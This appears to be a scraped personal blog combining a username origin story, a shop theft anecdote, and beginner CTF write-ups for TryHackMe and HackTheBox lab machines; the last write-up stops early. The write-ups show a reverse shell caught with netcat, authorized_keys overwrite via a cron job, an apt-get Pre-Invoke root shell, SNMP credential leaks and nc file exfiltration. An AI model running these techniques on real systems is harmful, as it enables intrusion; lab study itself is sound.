content.text: It all started back in 2020.

At that time, my Instagram username was @jvedant7. I liked it, and naturally, I wanted to use the same username across all other platforms. But there was a problem it was already taken almost everywhere.

So began the hunt for a new username.
I didn‚Äôt want something random or trendy. I wanted a name that actually meant something. To make things clearer, I set a few strict rules for myself:

items: No digits or special characters (I absolutely hate them)
It had to be available on all major platforms
And most importantly, it should contain all the letters of my name

content.text: With these criteria in mind, I went deep into the internet‚Äîsearching, experimenting, rearranging letters, and exploring meaningful names. After a lot of digging, I finally stumbled upon something interesting.
That‚Äôs when I found Vemacitrin.

content.html:
Wikipedia

Vemacitrin

Vemacitrin (Sanskrit), also known as Vepacitti (PƒÅli), is the name of a leader of the Asuras who figures prominently in many Buddhist s≈´tras.

Vemacitrin is the most prominent of the leaders of the Asuras in their fight with the devas of TrƒÅyastri·πÉ≈õa where they had formerly lived. After one battle he was made prisoner and bound before the throne of ≈öakra, ruler of TrƒÅyastri·πÉ≈õa, whom he treated with bitter verbal abuse. ≈öakra bore his insults patiently, and argued that such patience was a sign of strength, not of weakness.

content.text: The name felt unique, ancient, and strong‚Äîand the best part? It contained every letter of my name.

That moment, everything clicked.
The username was meaningful, clean, available across platforms, and deeply connected to my identity. And that‚Äôs how vemacitrind was born.
Sometimes, a username isn‚Äôt just a name‚Äîit‚Äôs a story.
Now, if you ever want to check whether I‚Äôm on a social media platform or not, just search for vemacitrind.

title: Unforgettable Sunday Afternoon at the Shop

content.text: I started helping my father in our shop when I was in the 3rd or 4th standard. What began as small tasks slowly turned into real responsibility. By 2021, when I was in 12th grade, I was just 17 years old‚Äîand running the shop entirely on my father‚Äôs behalf.

That Sunday afternoon seemed ordinary at first, but it turned into an experience I‚Äôll never forget.Three girls walked into the shop. They were wearing typical Indian dupattas wrapped around their faces, the way many girls do while riding two-wheelers. Without much conversation, they quickly picked a belt from the display. It was a cheap one‚Äî‚Çπ150.
I politely asked if they wanted an extra hole punched in the belt. They refused. I packed the belt in a bag, took a ‚Çπ2000 note from one of them, and returned ‚Çπ1850 in change.

That‚Äôs when things got strange.
The girl suddenly said, ‚ÄúIt‚Äôs only one belt.‚Äù

For a moment, I was confused. Did they think they were getting two belts for ‚Çπ150? I calmly explained that one belt costs ‚Çπ150. Without arguing further, they refused to buy it. They handed back the belt and the change I had given them, and I returned the ‚Çπ2000 note.

Everything happened very fast‚Äîbut something didn‚Äôt feel right.
As soon as they turned to leave, I checked the cash. My heart sank. ‚Çπ600 was missing‚Äîthree ‚Çπ200 notes.
I was stunned üò∂.

Instinctively, I rushed from behind the counter and shouted in Gujarati,
‚ÄúAai jao, lai lo 150 ma 2!‚Äù
(‚ÄúCome back, take two belts for ‚Çπ150!‚Äù)

All three of them turned back.As the girl who had handed me the money came closer, I grabbed her hand and twisted it slightly‚Äîand there they were. The missing ‚Çπ200 notes clenched in her palm. I snatched the money back and yelled, asking why she had taken it.
They immediately started making excuses, claiming it was a mistake.

By then, my voice was loud enough to draw attention. Nearby shopkeepers came out to see what was happening. One of them advised me to let the girls go, saying that calling the police would only create more trouble‚Äîespecially since my father was out of town.
After they left, I stood there frozen. For nearly ten minutes, I could barely breathe.

That incident changed me.
Until that day, I believed running a shop was simple‚Äîsell, bill, smile, repeat. But I learned, far too early, that being a shopkeeper also means being alert, brave, and ready to face situations no textbook ever prepares you for.
This is Probably one of easiest CTF challenges on TryHackMe. But again, it's a good exercise for beginners practiceing their skills.
Just like always, I started with an Nmap scan to identify open ports and services running on the target machine.

‚îå‚îÄ‚îÄvemacitrind„âøvemacitrind-[~/Documents/TryHackMe/PickleRick]
‚îî‚îÄ$ nmap -sS -T4 -n 10.48.168.199

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-16 14:39 IST
Nmap scan report for 10.48.168.199
Host is up (0.094s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.50 seconds
I just ignored the ssh becuase as long as we don't have any credentials we can't do much with it. So I moved to port 80 which is hosting a web application.

I find it running Apache HTTP Server 2.4.41. So I thought for a easy challenge, there must be some known vulnerabilities. After a quick search for it but i found nothing useful. So I decided to enumerate the web application further using ffuf.
I found assests directory containing bunch of photos and .gif files. Nothing useful
While trying to find something interesting, I found Username in source code.

So I had Username but no password. While exploring further I visit robots.txt and found something like 'Wubbalubbadubdub'. As a Rick and Morty fan, I knew it's password. I tryed to login with these credentials on ssh but it didn't worked. So I try to find some place where I can use these credentials. I remembered assests directory. there were multiple images But none of them were use anywhere in the web there should be some place where these images are used. I try every imgname + .php and finally I found one.
I found an login page. After Logining with above credentials, I was in.
There was a command panel so I try ls and it worked. I found there were file 'Sup3rS3cretPickl3Ingred.txt' i try to read it using cat command and this happended.
It seems we have a little bit of a challenge here. I try diffrent cmd like head, tail, echo $(cat ...) and finally less worked. And we got 1 out 3 ingredients aka flag.
less Sup3rS3cretPickl3Ingred.txt
I keep messing around with command panel and I run 'sudo -l' and found that www-data can run ALL as root without password.

Matching Defaults entries for www-data on ip-10-48-168-199:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
User www-data may run the following commands on ip-10-48-168-199:
    (ALL) NOPASSWD: ALL
Then it become child play. I just run sudo less /home/rick/flag.txt and sudo less /root/flag.txt to get both user and root flag.
Smag Grotto is a easy box challenge on TryHackMe where i have to find user and root flag.
As usaly, I started with an Nmap scan to identify open ports and services running on the target machine.

‚îå‚îÄ‚îÄvemacitrind„âøvemacitrind-[~/Documents/TryHackMe/SmagGrotto]
‚îî‚îÄ$ nmap -sS -T4 -n 10.49.180.95
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-17 20:34 IST
Nmap scan report for 10.49.180.95
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 3.11 seconds
Machine running two services ssh and http services. I went to http first and see it using Apache httpd 2.4.18.
I search for CVE for Apache server but found nothing useful. So I decided to enumerate the web application further using ffuf.

┌──vemacitrind㉿vemacitrind-[~/Documents/TryHackMe/SmagGrotto]
└─$ ffuf -u http://10.49.180.95/FUZZ -w ~/Documents/SecLists/Discovery/Web-Content/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.180.95/FUZZ
 :: Wordlist         : FUZZ: /home/vemacitrind/Documents/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4784ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4784ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4784ms]
index.php               [Status: 200, Size: 402, Words: 69, Lines: 13, Duration: 25ms]
mail                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 25ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 34ms]
:: Progress: [4751/4751] :: Job [1/1] :: 1298 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
I found page `mail` suspesious.
Visiting the page, I found a `dHJhY2Uy.pcap`
I downloaded the file and opened it in Wireshark to analyze the traffic.
After analyzing the pcap file, I found an login credentials in one of the packet's payload.
In another packet, I found a new subdomain and login.php. I added it to my /etc/hosts file.

┌──vemacitrind㉿vemacitrind-[~/Documents/TryHackMe/SmagGrotto]
└─$ echo '10.49.180.95 smag.thm' | sudo tee -a /etc/hosts    
[sudo] password for vemacitrind: 
10.49.180.95 smag.thm

┌──vemacitrind㉿vemacitrind-[~/Documents/TryHackMe/SmagGrotto]
└─$ echo '10.49.180.95 development.smag.thm' | sudo tee -a /etc/hosts
10.49.180.95 development.smag.thm

I visited the login.php page on development.smag.thm and logged in using above credentials.There was an command panel where I can run php commmands. I went to GTFObins and get pgp shell command for php and got a reverse shell.

┌──vemacitrind㉿vemacitrind-[~]
└─$ nc -l -p 12345
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash -i
www-data@smag:/var/www/development.smag.thm$
First I check for SUID files but found nothing useful. Then I check passwd, shadow and crontab and I found way to privesc to user.

www-data@smag:/var/www$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys
#
there were a cron job which reads /opt/.backups/jake_id_rsa.pub.backup and write it to /home/jake/.ssh/authorized_keys. So I just create my own ssh key pair.

┌──vemacitrind㉿vemacitrind-[~/Documents/bandit]
└─$ ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vemacitrind/.ssh/id_rsa): jake
Enter passphrase for "jake" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in jake
Your public key has been saved in jake.pub
The key fingerprint is:
SHA256:rIt5G6rUJC9ZuMoCKLANCQfcWA0vMNPD/O8j+22JjyM vemacitrind@vemacitrind
The key's randomart image is:
+---[RSA 4096]----+
|o=Boo            |
|.o=*..           |
|.o .o.           |
|+  ... .         |
|o+o o . S        |
|= .O   o         |
|o = o + . .      |
|oo . E.Boo       |
|o...+oB+=o       |
+----[SHA256]-----+
And write the contents of jake.pub to /opt/.backups/jake_id_rsa.pub.backup

www-data@smag:/$ echo 'ssh-r...' > /opt/.backups/jake_id_rsa.pub.backup
<rind@vemacitrind' > /opt/.backups/jake_id_rsa.pub.backup 
www-data@smag:/$
After waiting 1-2 minute, I run `ssh -i jake jake@smag.thm` and I was in as jake. Very first I checked for sudo privilages using `sudo -l` .

┌──vemacitrind㉿vemacitrind-[~/Documents/bandit]
└─$ ssh -i jake jake@smag.thm
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020

jake@smag:~$ jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
I found that jake can run apt-get as root without password. Again went to GTFObins and grab cmd and paste it in terminal and ...

jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
root@smag:/home/jake# id
uid=0(root) gid=0(root) groups=0(root)
Another box and first HackTheBox writeup. This is an medium difficulty box. Which drives me crazy for 2 days. But finally I get that...
As usaly, I started with an Nmap scan to identify open ports and services running on the target machine.

┌──vemacitrind㉿vemacitrind-[~/Documents/hackthebox/Machine/AirTouch]
└─$ nmap -sVC -p 22 10.129.244.98  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 19:28 IST
Nmap scan report for 10.129.244.98
Host is up (0.34s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)
|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)
|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
Hmmm...Only ssh port was open. I can't do much with only ssh port open and for sure i cannot bruteforce ssh without any username. So I decided to scan UDP ports as well.

┌──vemacitrind㉿vemacitrind-[~/Documents/hackthebox/Machine/AirTouch]
└─$ nmap -sU --top-ports 100 10.129.244.98 

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 19:33 IST
Nmap scan report for 10.129.244.98
Host is up (0.32s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp

Nmap done: 1 IP address (1 host up) scanned in 111.43 seconds
Ahh han SNMP port was open , but i don't know much about it. So I search basic snmp enumeration commands and found snmpwalk command. I runed it using default community string 'public'.

┌──vemacitrind㉿vemacitrind-[~/Documents/hackthebox/Machine/AirTouch]
└─$ snmpwalk -v2c -c public 10.129.244.98 

iso.3.6.1.2.1.1.1.0 = STRING: ""The default consultant password is: melody-khao-khud-janjao (change it after use it)""
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (83831) 0:13:58.31
iso.3.6.1.2.1.1.4.0 = STRING: "admin@AirTouch.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "Consultant"
iso.3.6.1.2.1.1.6.0 = STRING: ""Consultant pc""
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."

iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."

iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing IP and ICMP implementations"

iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00

iso.3.6.1.2.1.25.1.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
Bingo! In the very first line I found the default password for 'Consultant' user is 'melody-khao-khud-janjao'.
I did ssh login using these credentials and I was in. and run `ls -al` to gain user flag.

consultant@AirTouch-Consultant:~$ ls -al
total 888
drwxr-xr-x 1 consultant consultant   4096 Jan 26 14:13 .
drwxr-xr-x 1 root       root         4096 Jan 13 14:55 ..
lrwxrwxrwx 1 consultant consultant      9 Mar 27  2024 .bash_history -> /dev/null
-rw-r--r-- 1 consultant consultant    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 consultant consultant   3771 Feb 25  2020 .bashrc
drwx------ 2 consultant consultant   4096 Jan 26 14:13 .cache
-rw-r--r-- 1 consultant consultant    807 Feb 25  2020 .profile
-rw-r--r-- 1 consultant consultant 131841 Mar 27  2024 diagram-net.png
-rw-r--r-- 1 consultant consultant 743523 Mar 27  2024 photo_2023-03-01_22-04-52.png
There was no user flag in home directory. And as per second rule of my dictionary, I check sudo perivilages using `sudo -l`.

┌──vemacitrind㉿vemacitrind-[~/Documents/hackthebox/Machine/AirTouch]
└─$ ls
a  diagram-net.png  steps.txt

consultant@AirTouch-Consultant:~$ sudo -l
Matching Defaults entries for consultant on AirTouch-Consultant:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
At that moment, I realized that i'm *COOKED* becuase no way a medium box will have such an easy privesc. I got root shell using `sudo su`. I checked /root directory and found nothing.
Very next thing, I get two images in consultant home directory using nc.

(Terminal 1 - Receiving the file)
┌──vemacitrind㉿vemacitrind-[~/Documents/hackthebox/Machine/AirTouch]
└─$ nc -l -p 4444 > diagram-net.png

(Terminal 2 - Sending the file)
consultant@AirTouch-Consultant:~$ nc 10.10.15.108 4444 < diagram-net.png 
^C
Same for other image as well. And here is our images:
Okay, From the diagram image, I can see there is an Interprise network with 3 VLANs. This box is more about how a single VLAN can cause a big security issue in entire network.

content.html: And for the flags it it's hidden in somewhere in the system [MITREATT&CK]
